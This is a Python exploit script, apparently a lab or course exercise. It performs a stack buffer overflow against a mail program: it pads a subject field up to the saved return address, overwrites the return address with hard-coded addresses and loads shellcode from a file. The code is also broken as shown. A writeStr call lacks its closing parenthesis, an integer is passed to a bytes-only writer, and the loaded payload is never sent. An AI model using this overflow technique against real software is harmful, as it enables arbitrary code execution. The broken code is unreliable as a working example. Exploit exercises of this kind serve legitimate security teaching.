#!/usr/bin/env python3
import sys
import struct

# make sure to use these functions to write strings or bytes (bytestring) so that the order is preserved
def writeStr(v):
    assert isinstance(v, str)
    sys.stdout.flush()
    sys.stdout.buffer.write(v.encode("ascii"))
    sys.stdout.flush()

def writeBytes(v):
    assert isinstance(v, bytes)
    sys.stdout.flush()
    sys.stdout.buffer.write(v)
    sys.stdout.flush()

def writeLong(v):
    assert isinstance(v, int)
    sys.stdout.flush()
    sys.stdout.buffer.write(v.to_bytes(8, 'little'))
    sys.stdout.flush()

# Use this to debug your attack.
def eprint(*args, **kwargs):
    print(*args, file=sys.stderr, **kwargs)

# read shellscript as bytestring, use writeBytes(payload) to write it out
with open("shell.bin", "rb") as f:
    payload = f.read()

# Here we have the address of the mutex struct.
pmutex = int(sys.stdin.readline(), 16)

mutex = 0x5555555580c0
mail_body = 0x555555558040

mail_subject = 0x7fffffffdde0
ripat = 0x7fffffffde08


writeStr("."*(ripat - mail_subject)
writeStr("\n")

writeBytes(mutex)
writeStr("\n")
